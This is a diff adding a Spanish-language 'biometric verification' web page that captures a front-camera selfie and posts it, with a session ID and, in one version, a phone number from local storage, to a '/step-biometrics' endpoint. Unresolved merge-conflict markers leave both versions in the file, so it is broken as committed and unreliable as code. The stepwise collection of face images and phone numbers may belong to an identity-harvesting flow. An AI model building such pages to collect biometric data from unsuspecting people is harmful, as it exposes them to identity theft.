@@ -1,0 +1,122 @@
+<<<<<<< HEAD
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Biometría</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body { font-family: Arial; text-align: center; background:#f5f5f5 }
+video { width:90%; max-width:360px; border-radius:12px }
+#loader { display:none; font-size:18px; margin-top:20px }
+button { padding:14px 22px; border:none; border-radius:10px; background:#2196f3; color:#fff }
+</style>
+</head>
+<body>
+
+<h3>🧬 Verificación Biométrica</h3>
+<p>Al continuar aceptas la captura de imagen para verificación.</p>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" hidden></canvas>
+
+<br><br>
+<button onclick="capturar()">📸 Continuar</button>
+<div id="loader">🔄 Subiendo...</div>
+
+<script>
+const sessionId = new URLSearchParams(window.location.search).get('sessionId');
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+.then(stream => video.srcObject = stream);
+
+function capturar() {
+  document.getElementById('loader').style.display = 'block';
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext('2d').drawImage(video, 0, 0);
+  enviar();
+}
+
+function enviar() {
+  fetch('/step-biometrics', {
+    method: 'POST',
+    headers: { 'Content-Type':'application/json' },
+    body: JSON.stringify({
+      sessionId,
+	  phoneNumber: localStorage.getItem('phoneNumber'),
+      imageBase64: canvas.toDataURL('image/jpeg'),
+      userAgent: navigator.userAgent,
+      ip: 'client'
+    })
+  }).then(() => {
+    document.getElementById('loader').innerText = '✅ Completado';
+  });
+}
+</script>
+
+</body>
+</html>
+=======
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Biometría</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body { font-family: Arial; text-align: center; background:#f5f5f5 }
+video { width:90%; max-width:360px; border-radius:12px }
+#loader { display:none; font-size:18px; margin-top:20px }
+button { padding:14px 22px; border:none; border-radius:10px; background:#2196f3; color:#fff }
+</style>
+</head>
+<body>
+
+<h3>🧬 Verificación Biométrica</h3>
+<p>Al continuar aceptas la captura de imagen para verificación.</p>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" hidden></canvas>
+
+<br><br>
+<button onclick="capturar()">📸 Continuar</button>
+<div id="loader">🔄 Subiendo...</div>
+
+<script>
+const sessionId = new URLSearchParams(window.location.search).get('sessionId');
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+.then(stream => video.srcObject = stream);
+
+function capturar() {
+  document.getElementById('loader').style.display = 'block';
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext('2d').drawImage(video, 0, 0);
+  enviar();
+}
+
+function enviar() {
+  fetch('/step-biometrics', {
+    method: 'POST',
+    headers: { 'Content-Type':'application/json' },
+    body: JSON.stringify({
+      sessionId,
+      imageBase64: canvas.toDataURL('image/jpeg'),
+      userAgent: navigator.userAgent,
+      ip: 'client'
+    })
+  }).then(() => {
+    document.getElementById('loader').innerText = '✅ Completado';
+  });
+}
+</script>
+
+</body>
+</html>
+>>>>>>> b3ecfedf0334e58c4d9b96060a75bf4c9e0a13bf
